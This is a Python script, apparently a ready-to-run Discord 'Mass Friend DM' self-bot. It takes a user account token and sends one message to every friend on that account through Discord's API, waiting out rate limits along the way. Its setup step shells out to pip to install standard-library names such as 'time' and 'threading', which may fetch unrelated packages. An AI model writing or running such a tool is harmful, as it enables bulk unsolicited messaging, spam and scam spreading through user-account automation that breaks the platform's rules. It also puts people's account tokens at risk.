import os

packages = ['requests', 'time', 'datetime', 'colorama', 'threading']

def get_system():
    if os.name == 'nt':
        return 'windows'
    elif os.name == 'posix':
        return 'linux'
    else:
        return 'unknown'

system = get_system()

def dl_packages():
    if system == 'windows':
        for package in packages:
            os.system(f'pip install {package}')
    elif system == 'linux':
        for package in packages:
            try:
                os.system(f'pip3 install {package}')
            except:
                os.system(f'apt install python3-{package}')
def clear():
    if system == 'windows':
        os.system('cls')
    elif system == 'linux':
        os.system('clear')
    else:
        os.system('cls||clear')

try:
    import requests
    import time
    import datetime
    import threading
    import colorama
except ModuleNotFoundError:
    dl_packages()

from random import randint
from datetime import datetime
from colorama import Fore, Style, Back
from time import sleep

class Colors:
    red = Fore.LIGHTRED_EX
    green = Fore.LIGHTGREEN_EX
    yellow = Fore.LIGHTYELLOW_EX
    blue = Fore.LIGHTBLUE_EX
    reset = Fore.RESET
    gray = Fore.LIGHTBLACK_EX
    bg_green = Back.LIGHTGREEN_EX
    bg_red = Back.LIGHTRED_EX
    bg_yellow = Back.LIGHTYELLOW_EX
    bg_reset = Back.RESET

num_friends = 0
num_messages = 0
failed = 0
start_time = datetime.now()

def info(msg):
    time = datetime.now().strftime('%H:%M:%S')
    print(f'{Colors.gray}{time}{Colors.blue} INF {Colors.gray}>{Colors.reset} {msg}')

def error(msg):
    time = datetime.now().strftime('%H:%M:%S')
    print(f'{Colors.gray}{time}{Colors.blue} ERR {Colors.gray}>{Colors.reset} {msg}')

def debug(msg):
    time = datetime.now().strftime('%H:%M:%S')
    print(f'{Colors.gray}{time}{Colors.blue} DBG {Colors.gray}>{Colors.reset} {msg}')

def update_title():
    while True:
        date = datetime.now().strftime('%d %b %Y %H:%M:%S')
        time_elapsed = int((datetime.now() - start_time).total_seconds())
        if system == 'windows':
            os.system(f'title {date} | Mass Friend DM | Friends: {num_friends} | Sent: {num_messages} | Failed: {failed} | Time Elapsed: {time_elapsed}s | @fedsfucker/coolptqs'.replace('|', '^|'))
        elif system == 'linux':
            pass
        sleep(1)

def send_messages():
    global num_friends, num_messages, failed
    token = input('Enter your token {}>>{} '.format(Colors.blue, Colors.reset))
    message = input('Enter your message {}>>{} '.format(Colors.blue, Colors.reset))
    print()
    headers = {'Authorization': token}

    response = requests.get('https://discord.com/api/v8/users/@me/relationships', headers=headers)
    if response.status_code == 200:
        friends = [user for user in response.json() if user['type'] == 1] 
        num_friends = len(friends)
        for friend in friends:
            payload = {'recipient_id': friend['id']}
            response = requests.post('https://discord.com/api/v8/users/@me/channels', headers=headers, json=payload)
            if response.status_code == 200:
                dm_channel = response.json()
                payload = {'content': message}
                response = requests.post(f'https://discord.com/api/v8/channels/{dm_channel["id"]}/messages', headers=headers, json=payload)
                match response.status_code:
                    case 200:
                        num_messages += 1
                        info(f"Successfully sent '{message}' to [{friend["id"]}] {Colors.gray}[{Colors.bg_green}{response.status_code}{Colors.bg_reset}{Colors.gray}]{Colors.reset}")
                    case 429:
                        info(f"Ratelimited, waiting {response.json()['retry_after']} seconds... {Colors.gray}[{Colors.bg_yellow}{response.status_code}{Colors.bg_reset}{Colors.gray}]{Colors.reset}")
                        sleep(response.json()['retry_after'])
                    case _:
                        failed += 1
                        debug(f"Failed to send '{message}' to {friend["id"]} {Colors.gray}[{Colors.bg_red}{response.status_code}{Colors.bg_reset}{Colors.gray}]{Colors.reset}")
        print()
        info("Messages sent: {} | Failed: {}".format(num_messages, failed))
    else:
        error('Invalid token.')
        sleep(2)
        clear()
        send_messages()

if __name__ == '__main__':
    clear()
    print(Colors.blue+"╔═╗╔╦╗╔═╗ ╔═╗")
    print("╠═╝ ║ ║═╬╗╚═╗")
    print("╩   ╩ ╚═╝╚╚═╝ © 2024"+Colors.reset)
    print("\nDiscord {}Mass Friend{} By {}@{}fedsfucker {}|{} coolptqs\n".format(Colors.blue, Colors.reset, Colors.blue, Colors.reset, Colors.blue, Colors.reset))
    threading.Thread(target=update_title).start()
    send_messages()
